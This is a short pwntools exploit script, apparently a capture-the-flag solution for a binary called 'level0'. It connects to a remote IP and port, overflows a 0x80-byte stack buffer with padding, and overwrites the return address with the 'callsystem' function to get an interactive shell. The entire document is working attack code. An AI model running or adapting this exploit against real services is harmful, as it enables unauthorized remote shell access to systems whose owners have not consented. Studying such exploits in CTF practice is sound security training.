from pwn import*
p=remote('111.198.29.45','42965')
elf=ELF('level0')
sys_addr=elf.symbols['callsystem']
payload=(0x80+8)*'a'+p64(sys_addr)
p.recvline()
p.send(payload)
p.interactive()  #we have a shell offered by system

